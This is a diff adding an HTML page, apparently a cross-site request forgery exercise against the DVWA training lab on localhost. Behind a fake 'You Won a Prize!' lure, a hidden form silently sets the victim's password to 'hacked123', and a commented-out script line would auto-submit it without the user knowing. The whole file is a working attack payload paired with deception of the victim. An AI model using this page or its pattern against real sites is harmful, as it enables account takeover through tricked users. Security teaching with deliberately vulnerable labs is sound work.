@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>You Won a Prize!</title>
+</head>
+<body>
+    <h1> Congratulations! You've Won!</h1>
+    <p>Click the button below to claim your prize:</p>
+    
+    <form id="csrf" action="http://localhost/dvwa/vulnerabilities/csrf/" method="GET">
+        <input type="hidden" name="password_new" value="hacked123">
+        <input type="hidden" name="password_conf" value="hacked123">
+        <input type="hidden" name="Change" value="Change">
+        <button type="submit">Claim Prize</button>
+    </form>
+    
+    <script>
+        // Auto-submit the form without user knowing
+        // Uncomment to auto-submit:
+        // document.getElementById("csrf").submit();
+    </script>
+</body>
+</html>
